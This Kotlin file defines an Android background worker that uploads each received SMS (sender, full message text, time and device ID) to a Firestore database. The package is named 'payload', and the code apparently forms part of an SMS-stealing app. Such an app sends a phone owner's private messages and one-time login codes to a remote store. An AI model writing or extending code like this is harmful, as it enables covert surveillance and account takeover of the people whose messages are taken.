package com.payload.jansiix0ne.worker

import android.content.Context
import android.util.Log
import androidx.work.CoroutineWorker
import androidx.work.WorkerParameters
import com.payload.jansiix0ne.data.model.SmsModel
import com.payload.jansiix0ne.data.repository.FirestoreRepository
import com.payload.jansiix0ne.util.SmsHelper
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext
import java.util.Date

/**
 * Worker that uploads SMS to Firestore
 */
class SmsUploadWorker(
    context: Context,
    params: WorkerParameters
) : CoroutineWorker(context, params) {

    private val firestoreRepository = FirestoreRepository()

    override suspend fun doWork(): Result = withContext(Dispatchers.IO) {
        try {
            val from = inputData.getString("from") ?: return@withContext Result.failure()
            val message = inputData.getString("message") ?: return@withContext Result.failure()
            val timeLong = inputData.getLong("time", -1)
            
            if (timeLong == -1L) {
                return@withContext Result.failure()
            }
            
            val deviceId = inputData.getString("deviceId") ?: SmsHelper.getDeviceId(applicationContext)
            
            val sms = SmsModel(
                from = from,
                message = message,
                date = Date(timeLong),
                ownerDeviceId = deviceId
            )
            
            val result = firestoreRepository.storeSms(sms, deviceId)
            
            if (result.isSuccess) {
                Log.d(TAG, "SMS uploaded successfully")
                Result.success()
            } else {
                Log.e(TAG, "Failed to upload SMS: ${result.exceptionOrNull()?.message}")
                Result.retry()
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error in SmsUploadWorker: ${e.message}", e)
            Result.failure()
        }
    }

    companion object {
        private const val TAG = "SmsUploadWorker"
    }
}
